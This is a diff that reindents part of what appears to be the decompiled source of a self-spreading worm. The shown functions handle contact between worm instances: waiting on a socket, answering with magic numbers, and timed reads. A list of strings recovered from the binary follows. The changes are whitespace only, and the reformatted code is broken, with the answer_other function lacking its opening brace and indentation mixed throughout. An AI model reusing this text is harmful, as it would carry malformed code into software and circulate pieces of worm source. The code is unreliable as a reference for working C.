@@ -11,6 +11,7 @@
 #include <sys/stat.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
+
 extern struct hst *h_addr2host(),*h_name2host();
 extern int  justreturn();
 extern int errno;
@@ -20,6 +21,7 @@ int ngateways,*gateways;
 struct hst *me,*hosts;
 int nifs;
 struct ifses ifs[30];	/*  Arbitrary number, fix */
+
 /* Clean hosts not contacted from the host list. */
 h_clean()	/* 0x31f0 */
 {
@@ -1004,43 +1006,44 @@ checkother()					/* 0x57d0 */
 /* Sleep, waiting for another worm to contact me. */
 other_sleep(how_long)				/* 0x5a38 */
 {
-    int nfds, readmask;
-    long time1, time2;
-    struct timeval timeout;
-    if (other_fd<0) {
-	if (how_long!=0)
+  int nfds, readmask;
+  long time1, time2;
+  struct timeval timeout;
+  if (other_fd<0) {
+	  if (how_long!=0)
 	    sleep(how_long);
-	return;
-    }
-    /* Check once again.. */
-    do {
-	if (other_fd<0)
+	  return;
+  }
+  /* Check once again.. */
+  do {
+    if (other_fd<0)
 	    return;
-	readmask=1<<other_fd;
-	if (how_long<0)
+    readmask=1<<other_fd;
+	  if (how_long<0)
 	    how_long=0;
-	timeout.tv_sec=how_long;
-	timeout.tv_usec=0;
-	if (how_long!=0)
+	  timeout.tv_sec=how_long;
+	  timeout.tv_usec=0;
+	  if (how_long!=0)
 	    time(&time1);
-	nfds=select(other_fd+1,&readmask,0,0,&timeout);
-	if (nfds<0)
+	  nfds=select(other_fd+1,&readmask,0,0,&timeout);
+	  if (nfds<0)
 	    sleep(1);
-	if (readmask!=0)
+	  if (readmask!=0)
 	    answer_other();
-	if (how_long!=0) {
+	  if (how_long!=0) {
 	    time(&time2);
 	    how_long-=time2-time1;
-	}
-    } while (how_long>0);
-    return;
+	  }
+  } while (how_long>0);
+  return;
 }
+
 static answer_other()				/* 0x5b14 */
-    int ns,addrlen,magic_holder,magic1,magic2;
-    struct sockaddr_in sin;			/* 16 bytes */
-    addrlen=sizeof(sin);
-    ns=accept(other_fd,&sin,&addrlen);
-    if (ns<0)
+int ns,addrlen,magic_holder,magic1,magic2;
+struct sockaddr_in sin;			/* 16 bytes */
+addrlen=sizeof(sin);
+ns=accept(other_fd,&sin,&addrlen);
+if (ns<0)
 	return;					/* 620 */
     magic_holder=MAGIC_1;
     if (write(ns,&magic_holder,sizeof(magic_holder))!=sizeof(magic_holder)
@@ -1075,29 +1078,31 @@ static answer_other()				/* 0x5b14 */
     }
     return;
 }
+
 /* A timeout-based read. */
 xread(fd,buf,length,time)	/* 0x5ca8 */
-     int fd,time;
-     char *buf;
-     unsigned long length;
+int fd,time;
+char *buf;
+unsigned long length;
 {
-    int i,cc,readmask;
-    struct timeval timeout;
-    int nfds;
-    long time1,time2;
-    for (i=0; i<length; i++) { 		/* 150 */
-	readmask=1<<fd;
-	timeout.tv_sec=time;
-	timeout.tv_usec=0;
-	if (select(fd+1,&readmask,0,0,&timeout)<0)
+  int i,cc,readmask;
+  struct timeval timeout;
+  int nfds;
+  long time1,time2;
+  for (i=0; i<length; i++) { 		/* 150 */
+    readmask=1<<fd;
+	  timeout.tv_sec=time;
+	  timeout.tv_usec=0;
+    if (select(fd+1,&readmask,0,0,&timeout)<0)
 	    return(0);				/* 156 */
-	if (readmask==0)
+	  if (readmask==0)
 	    return(0);
-	if (read(fd,&buf[i],1)!=1)
+	  if (read(fd,&buf[i],1)!=1)
 	    return(0);
-    }
-    return(i);
+  }
+  return(i);
 }
+
 /* These are some of the strings that are encyphed in the binary.  The
  * person that wrote the program probably used the Berkeley 'xstr' program
  * to extract and encypher the strings.
@@ -1115,7 +1120,7 @@ char *env91="127.0.0.1";
 char *env102="/usr/ucb/netstat -r -n"; /* 0x20066 */
 char *env125="r";
 char *env127="%s%s";
-#endif /* notdef*/
+#endif /* notdef */
 /*
   char *text =
   "default
